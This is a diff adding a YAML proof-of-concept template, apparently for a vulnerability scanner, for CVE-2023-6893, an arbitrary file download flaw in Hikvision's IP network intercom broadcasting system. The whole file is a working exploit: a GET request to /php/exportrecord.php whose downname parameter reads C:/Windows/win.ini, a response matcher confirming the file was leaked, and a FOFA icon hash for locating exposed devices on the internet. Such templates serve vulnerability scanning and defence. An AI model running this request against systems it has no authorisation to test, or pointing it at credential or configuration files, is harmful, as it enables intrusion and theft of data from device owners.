@@ -1,0 +1,16 @@
+id: poc-yaml-hikvision-ip-network-intercom-broadcasting-system-exportrecord-php-anyfile-download
+info:
+  name: 海康威视 IP网络对讲广播系统 exportrecord.php 任意文件下载漏洞(CVE-2023-6893)
+  severity: critical
+  tags:
+  - CVE-2023-6893
+  - 任意文件或目录访问
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+requests:
+- method: GET
+  path: /php/exportrecord.php?downtype=10&downname=C:/Windows/win.ini
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"[files]")
+    && !contains(body,"<")
+variables: {}
+transport: http
